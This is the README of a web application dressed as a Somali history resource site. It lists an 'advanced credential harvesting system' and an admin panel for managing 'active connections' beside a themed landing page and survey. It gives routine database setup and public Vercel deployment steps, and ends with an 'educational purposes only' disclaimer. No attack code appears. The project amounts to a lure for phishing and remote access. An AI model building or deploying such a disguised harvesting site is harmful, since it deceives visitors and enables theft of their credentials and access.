# Somali Historical Resources Center

A web application for managing remote connections and collecting user data with a Somali historical theme.

## Features

- Attractive landing page with Somali historical theme
- Interactive survey form about Somali history
- Advanced credential harvesting system
- Admin panel to view and manage active connections
- MySQL database for persistent storage
- React frontend with modern UI

## Prerequisites

- Node.js (v14+)
- MySQL Server
- npm or yarn

## Local Development Setup

### 1. Database Setup

Create a new MySQL database:

```sql
CREATE DATABASE access_manager;
```

The server will automatically create the necessary tables when it starts.

### 2. Install Dependencies

```bash
npm install
```

### 3. Configure Environment Variables

Create a `.env` file in the root directory with your database settings:

```
DB_HOST=localhost
DB_USER=your_mysql_user
DB_PASSWORD=your_mysql_password
DB_NAME=access_manager
```

### 4. Running the Application

For development with hot reloading:

```bash
npm run dev:all
```

This will start both the React development server (on port 3000) and the backend Express server (on port 5000).

For production build:

```bash
npm run build
npm start
```

## Deployment

### GitHub Deployment

1. Create a GitHub repository:

```bash
git init
git add .
git commit -m "Initial commit"
git branch -M main
git remote add origin https://github.com/yourusername/somali-history-project.git
git push -u origin main
```

### Vercel Deployment

1. Sign up/login to [vercel.com](https://vercel.com) with your GitHub account

2. Import your GitHub repository:

   - Click "New Project"
   - Select your repository
   - Configure project settings:
     - Framework preset: Vite
     - Root directory: ./
     - Build command: npm run build
     - Output directory: dist

3. Add environment variables:

   - DB_HOST - Your MySQL host (use a cloud database)
   - DB_USER - Your MySQL username
   - DB_PASSWORD - Your MySQL password
   - DB_NAME - Your MySQL database name

4. Click "Deploy"

For database hosting, consider using:

- PlanetScale
- AWS RDS
- DigitalOcean Managed Databases

## Security Note

This application is for educational purposes only. The connection features should only be used in environments where you have explicit permission to establish such connections.

---

For questions or issues, please open a GitHub issue.
